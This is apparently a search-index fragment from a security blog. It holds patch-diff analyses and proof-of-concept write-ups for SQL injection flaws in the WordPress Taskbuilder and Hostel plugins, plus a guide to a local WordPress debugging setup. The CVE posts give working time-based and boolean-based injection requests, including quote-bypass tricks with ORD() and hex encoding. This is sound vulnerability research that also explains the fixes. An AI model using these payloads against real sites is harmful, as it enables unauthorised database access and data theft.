\u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = \u0026#39;$proj_id\u0026#39;\u0026#34; ); This patch ensures that the $proj_id value after escaping is treated as a literal string, preventing it from escaping the quotes to inject SQL syntax, effectively mitigating the SQL Injection.\nHow It Works File Architecture:\nGeneral structure of the current file:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project WHERE id = $proj_id\u0026#34;); // Start buffer to generate the main modal content ob_start(); // ... render HTML user list $body = ob_get_clean(); // Start buffer to generate modal footer ob_start(); // ... render HTML buttons (Close, Save) $footer = ob_get_clean(); // Return JSON data for frontend modal rendering echo json_encode([ \u0026#39;body\u0026#39; =\u0026gt; $body, \u0026#39;footer\u0026#39; =\u0026gt; $footer, ]); $proj_id / $project: Fetch project data from the database. ob_start() / ob_get_clean(): Buffer HTML output instead of printing directly, storing it in a variable. $body / $footer: Contain dynamic HTML for the modal. json_encode(): Returns JSON to the client, often used in Ajax to render modals without refreshing the page. The file is located in includes, suggesting it’s called from another feature. To find where it’s used, search for get_users.php in the plugin directory.\n👉 It is included in the function wppm_get_users() of the class WPPM_Admin in class-wppm-admin.php. wppm_get_users() is a callback for a WordPress action hook.\nWPPM_Admin constructor:\nfinal class WPPM_Admin { public function __construct() { // other actions add_action( \u0026#39;wp_ajax_wppm_get_users\u0026#39;, array($this,\u0026#39;wppm_get_users\u0026#39;)); // other actions } } add_action() is a WordPress Plugin API method to attach a callback to an action hook.\nwp_ajax_wppm_get_users is an Ajax hook name:\nwp_ajax_{action} → handles Ajax for logged-in users. wp_ajax_nopriv_{action} → handles Ajax for non-logged-in users. Here, action = wppm_get_users. If you send action=wppm_get_users via Ajax to admin-ajax.php, WordPress will execute the corresponding callback, here wppm_get_users().\n👉 Knowing action = wppm_get_users, you can find which Ajax requests use it by searching wppm_get_users in .js files of the plugin.\nThe wppm_get_users action is the data part in the POST request handled by wppm_get_users().\nThe function is referenced in HTML attributes of the project feature:\nCreate a new project Access that project Inspect code to locate wppm_get_users and see which actions call it 👉 Clicking the icon next to Users triggers Ajax, sending a request to the server to fetch project users and render them in HTML.\nExploit Detect SQLi Capture requests using BurpSuite and send a time-based SQLi payload:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+SLEEP(1)) Response delay indicates a successful SQL Injection.\nGet First Letter of Database Name To dump all data, the first step is to extract at least one character of the database name. Once retrieved, the rest can be dumped.\nSend a boolean-based SQLi payload with the correct proj_id:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999)) Database name is wordpress, so the first character is w (HEX 0x77).\nSUBSTRING(STRING,1,1) retrieves the first character.\nHere, $proj_id = 4. Since SUBSTRING('wordpress',1,1)=0x77 is true, the IF(condition, value_if_true, value_if_false) returns 4, which exists in the database, so the response contains the project users.\nUsing HEX technique bypasses the esc_sql() function (see Patch Diff) when quotes cannot be used.\nSend a boolean-based SQLi payload with a wrong proj_id:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4)) With a non-existent proj_id, the response contains None.\n👉 We successfully retrieved the first character of the database name using boolean-based SQLi:\nCorrect proj_id: response without None Wrong proj_id: response contains None Time-based SQLi could also be used, but dumping large data sets would be slow.\nConclusion The CVE-2025-39569 vulnerability in WordPress Taskbuilder arises from the missing single quotes '...' around user input in SQL queries, allowing user data to be interpreted as valid SQL syntax.\nThe patch in v4.0.2 fixed this by wrapping $proj_id in quotes, ensuring it is always treated as a literal string in SQL.\nKey Takeaways:\nPrefer prepared statements ($wpdb-\u0026gt;prepare() in WordPress) over manually inserting variables into queries. For WordPress plugins, thoroughly test Ajax endpoints, as they are the most common sources of SQLi and XSS. Administrators should regularly update plugins/themes to receive security patches promptly. References SQL Injection Cheat Sheet - PortSwigger\nWordPress Taskbuilder \u0026lt;= 4.0.1 Vulnerable to SQL Injection\n","permalink":"//localhost:1313/posts/2025-09-22-cve-2025-39569/","summary":"\u003cp\u003eThe vulnerability occurs in the \u003cstrong\u003eTaskbuilder\u003c/strong\u003e WordPress plugin before version \u003cstrong\u003e4.0.2\u003c/strong\u003e. This could allow an attacker to directly interact with your database, including, but not limited to, stealing information.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39569\"\u003eCVE-2025-39569\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/taskbuilder/\"\u003eWordPress Taskbuilder Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 4.0.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS Severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e: v4.0.1 (vulnerable) and v4.0.2 (patched)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDiff Tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e or any tool that can compare files to see differences between two versions\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eThe application \u003cstrong\u003esanitizes input data\u003c/strong\u003e before using it in SQL queries. However, during query construction, this value is inserted directly without being wrapped in single quotes \u003ccode\u003e'...'\u003c/code\u003e. This allows an attacker to inject valid SQL syntax (such as \u003ccode\u003eOR\u003c/code\u003e, \u003ccode\u003eAND\u003c/code\u003e, etc.) into the query, resulting in a SQL Injection vulnerability.\u003c/p\u003e","title":"CVE-2025-39569 Analysis \u0026 POC"},{"content":"A vulnerability in the Hostel plugin prior to version 1.1.5.7. Because input is not sanitized properly, this may allow an attacker to interact directly with the database, including but not limited to data exfiltration.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6 (vulnerable) and v1.1.5.7 (fixed) diff tool: meld or any tool capable of comparing two versions to show differences Analysis The root cause is that the application injects data from a GET request directly into an SQL query while the validation/whitelisting is insufficient.\nPatch Diff Use any diff tool to compare the vulnerable version and the patched version. A clear difference exists in the file controllers/bookings.php\nVulnerable version:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } Patched version:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } 👉 The patch uses a whitelist to restrict which columns can be used for ordering; if the supplied value is not valid it falls back to 'tB.id'.\nAnalysis: The vulnerability appears because the ob parameter is passed directly into the ORDER BY clause after sanitize_text_field(). That function only escapes/cleans text for HTML contexts and does not validate or filter for SQL injection in an SQL context.\nHow it works To inject, we need to identify the complete query used here:\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); The query resides in the default branch of the switch structure.\nAll this logic belongs to the static manage() method of the WPHostelBookings class.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } In WordPress, plugins communicate with core via the Plugin API (Hook System). Therefore, to find where manage() is invoked, we can search for the string \u0026quot;manage\u0026quot; in the plugin folder.\nIn the file models/hostel.php we have:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } Here:\nadd_menu_page() creates the main menu in the Admin Dashboard. add_submenu_page() adds submenu items under that menu. The $callback parameter is the callback function invoked when a user clicks the menu/submenu. Example:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() All these menu/submenu items are registered inside the static menu() method of the WPHostel class. To locate where menu() is called, search for the menu hook in the plugin directory.\nIn the plugin root file hostel.php we have:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() is the WordPress Plugin API that attaches a callback to an action hook. The hook name here is admin_menu, meaning WPHostel::menu() will be called during the lifecycle when WordPress builds the Admin Dashboard Menu. Menu in the Admin UI\nDebugging\nThe faulty functionality is in the Booking Manager, so navigate to the Manage Bookings submenu in the Admin UI.\nRight before the default branch there is a comment // list bookings — indicating this code handles listing and ordering bookings.\nOpen your debugger:\nClick Run with Debugger. Set a breakpoint at the switch branch that contains the vulnerable code and at the exact line that assigns the vulnerable value. When you click a column header in the bookings table, observe:\nThe debugger steps into the switch. Use Step Over to reach the default branch. Continue Step Over and inspect variables in Variables \u0026gt; Locals. These variables combine to form the SQL query below. After combining the variables, the full query looks like:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... Notably, the $orderby variable is assigned as:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } ⚠️ Issues here:\nThe part after ORDER BY uses sanitize_text_field(). That function only cleans HTML, and does not validate or filter input to make it safe in an SQL context. Therefore the ob parameter (provided by the user) can be abused to inject SQL directly. Exploit Detecting SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 We separate the ORDER BY clause with a comma because it accepts multi-column values.\nResult: the response time is delayed → SQL Injection succeeded.\nDumping Data from the Database Bypass ' using ORD():\nTo dump database data we need to extract characters such as the first character of the database name.\nBecause sanitize_text_field() removes single quotes ('), we cannot use payloads relying on '. Instead, use ORD() to compare character ASCII codes:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Bypass succeeds → we can extract the database name.\nBypass ' using Hex encoding (alternative)\nBesides ORD() we can use Hex encoding to bypass:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Bypass succeeds → database name can be extracted.\nConclusion The vulnerability CVE-2025-39566 in the WordPress Hostel plugin (versions prior to 1.1.5.7) stems from inserting user-supplied input directly into an SQL query without adequate safeguards, leading to SQL Injection.\nKey takeaways:\nsanitize_text_field() ≠ protection against SQL Injection Distinguish clearly between input cleaning for HTML contexts and validation/sanitization for SQL contexts References SQL Injection Cheat Sheet – PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eA vulnerability in the \u003cstrong\u003eHostel\u003c/strong\u003e plugin prior to version \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Because input is not sanitized properly, this may allow an attacker to interact directly with the database, including but not limited to data exfiltration.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e: v1.1.5.6 (vulnerable) and v1.1.5.7 (fixed)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e or any tool capable of comparing two versions to show differences\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eThe root cause is that the application injects data from a \u003cstrong\u003eGET\u003c/strong\u003e request directly into an SQL query while the validation/whitelisting is insufficient.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress is a powerful and the most popular content management system (CMS) that allows you to create, manage, and customize websites and blogs easily. It’s an open-source CMS, built on PHP, and uses either MySQL or MariaDB databases.\nReleased in 2003, initially as a blogging platform, later evolved into a full-featured system for websites, online stores, forums, landing pages, etc. Today, more than 40% of websites worldwide run on WordPress. There are two versions of WordPress:\nWordPress.com\nHosting service provided by Automattic You only need to register an account, no installation required Limited customization, advanced features require payment WordPress.org\nOpen-source, you download and install it on your own hosting/server Full customization, install plugins, themes, write code, build any website you want Ecosystem Core: The main CMS Plugins: Add-on software installed on a WordPress site to extend functionality and add new features Themes: Add-on software that defines the visual appearance and layout of a WordPress site Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Currently, over 40% of all websites worldwide run WordPress This means hackers only need to find one common vulnerability =\u0026gt; they can exploit millions of sites at once Like the saying: “fish where the fish are” Plugin and Theme WordPress Core has been reviewed for a long time by thousands of developers and researchers, making it difficult for attackers to break in However, tens of thousands of plugins and themes from various sources are in use, with inconsistent quality Many plugins have poor security code or are no longer updated. Hackers only need to scan plugins/themes for outdated versions and exploit them Setup WordPress for Hacking There are many ways to set up WordPress; searching on Google will show plenty of guides. Here, I’ll set it up on an Ubuntu (22.04) virtual machine:\nNo effect on the host machine’s services WordPress is lightweight enough to run in a VM Install and Configure WordPress Install Dependencies Install the full stack needed to run WordPress (web server + database + PHP + required extensions).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress Download and install WordPress source code into the web directory.\n# Create a folder to store the website source code sudo mkdir -p /srv/www # Change owner to www-data, the default user for Apache/Nginx web server sudo chown www-data: /srv/www # Download the latest WordPress package from the official site # Extract it into /srv/www curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www To download a specific version:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www Installing from wordpress.org is the most reliable method:\nUbuntu provides a wordpress package in its repo, but it’s usually outdated compared to the official release. The WordPress community only supports the official release. If you encounter issues with the Ubuntu package, they won’t help. Configure Apache for WordPress Create /etc/apache2/sites-available/wordpress.conf:\n\u0026lt;VirtualHost *:80\u0026gt; DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks AllowOverride Limit Options FileInfo DirectoryIndex index.php Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; Enable WordPress site:\nsudo a2ensite wordpress Enable mod_rewrite:\nsudo a2enmod rewrite Disable default site (optional):\nsudo a2dissite 000-default Or add ServerName mywordpress.local in VirtualHost and update your system’s hosts file.\nReload Apache:\nsudo service apache2 reload Configure Database Open MySQL:\nsudo mysql -u root Create DB and user:\nCREATE DATABASE wordpress; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; FLUSH PRIVILEGES; quit Restart MySQL:\nsudo service mysql start Configure WordPress DB Connection Copy and edit config:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php Update DB info:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php Add secret keys/salts from: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Visit http://localhost and set site title, username, password, email for the admin user.\nSetup Debug on VSCode To understand request flow, we need debugging.\nAdd PHP Debug Extension In VS Code Extensions (Ctrl+Shift+X) =\u0026gt; search PHP Debug (by Felix Becker) =\u0026gt; Install.\nInstall Xdebug sudo apt install php-xdebug -y php -v If you see with Xdebug v3.x.x, installation is OK.\nConfigure Xdebug Edit php.ini:\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json Open project in VS Code:\ncode /srv/www/wordpress Add launch.json:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } Now WordPress is fully set up locally with VS Code debugging.\nExtend Required Version Each WordPress version requires a compatible PHP version. Check this to avoid setup errors.\nWordPress Auto Update Since WordPress 3.7 (2013), background automatic updates exist for:\nSecurity releases Maintenance releases Not for major versions (unless explicitly enabled) WordPress checks api.wordpress.org for updates and applies them automatically.\nTo disable auto-updates, add in wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size By default, WordPress relies on PHP configuration (upload_max_filesize, post_max_size, and sometimes max_execution_time) to determine the maximum file size that can be uploaded. On many servers, this limit is set as low as 2MB – 8MB, which is not enough for modern plugins.\nWhy Increase the Limit? Large plugins: Some plugins such as WooCommerce extensions, page builders, backup tools, or security suites can easily reach 20MB – 100MB.\nAvoid errors: If the plugin .zip file exceeds the limit, you’ll see errors like:\n“The uploaded file exceeds the upload_max_filesize directive in php.ini” Or the upload process fails silently. Ease of use: Increasing the limit allows administrators to upload plugins directly from the WordPress Dashboard without needing FTP/SSH access.\nDevelopment and testing: Developers testing their own plugins (with bundled assets like JS, CSS, images, or libraries) may generate larger .zip files. A higher limit makes local testing smoother.\nHow to Increase Plugin Upload Size There are several methods depending on your hosting environment:\nEdit php.ini (if you control the server)\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 Edit .htaccess (for Apache servers)\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 Update wp-config.php Add before the line /* That's all, stop editing! Happy publishing. */:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); 👉 It’s recommended to set a reasonable value (e.g., 64MB or 128MB). Avoid setting it too high (hundreds of MBs), as it may open the door to abuse (e.g., users uploading excessively large files that overload the server).\n","permalink":"//localhost:1313/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e is a powerful and the most popular content management system (CMS) that allows you to create, manage, and customize websites and blogs easily. It’s an open-source CMS, built on PHP, and uses either MySQL or MariaDB databases.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eReleased in 2003, initially as a blogging platform, later evolved into a full-featured system for websites, online stores, forums, landing pages, etc.\u003c/li\u003e\n\u003cli\u003eToday, more than 40% of websites worldwide run on WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eThere are two versions of WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"The vulnerability occurs in the Taskbuilder WordPress plugin before version 4.0.2. This could allow an attacker to directly interact with your database, including, but not limited to, stealing information.\nCVE ID: CVE-2025-39569 Product: WordPress Taskbuilder Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 4.0.2 CVSS Severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Taskbuilder Plugin: v4.0.1 (vulnerable) and v4.0.2 (patched) Diff Tool: meld or any tool that can compare files to see differences between two versions Analysis The application sanitizes input data before using it in SQL queries. However, during query construction, this value is inserted directly without being wrapped in single quotes '...'. This allows an attacker to inject valid SQL syntax (such as OR, AND, etc.) into the query, resulting in a SQL Injection vulnerability.\nPatch Diff Use any diff tool to compare differences between the vulnerable version and the patched version.\nThe clear difference is in the file includes/admin/projects/get_users.php.\nIn version v4.0.1, the variable $proj_id is escaped but inserted directly into the query without quotes:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = $proj_id\u0026#34; ); In version v4.0.2, the query is adjusted to wrap $proj_id in quotes after escaping:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = \u0026#39;$proj_id\u0026#39;\u0026#34; ); This patch ensures that the $proj_id value after escaping is treated as a literal string, preventing it from escaping the quotes to inject SQL syntax, effectively mitigating the SQL Injection.\nHow It Works File Architecture:\nGeneral structure of the current file:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project WHERE id = $proj_id\u0026#34;); // Start buffer to generate the main modal content ob_start(); // ... render HTML user list $body = ob_get_clean(); // Start buffer to generate modal footer ob_start(); // ... render HTML buttons (Close, Save) $footer = ob_get_clean(); // Return JSON data for frontend modal rendering echo json_encode([ \u0026#39;body\u0026#39; =\u0026gt; $body, \u0026#39;footer\u0026#39; =\u0026gt; $footer, ]); $proj_id / $project: Fetch project data from the database. ob_start() / ob_get_clean(): Buffer HTML output instead of printing directly, storing it in a variable. $body / $footer: Contain dynamic HTML for the modal. json_encode(): Returns JSON to the client, often used in Ajax to render modals without refreshing the page. The file is located in includes, suggesting it’s called from another feature. To find where it’s used, search for get_users.php in the plugin directory.\n👉 It is included in the function wppm_get_users() of the class WPPM_Admin in 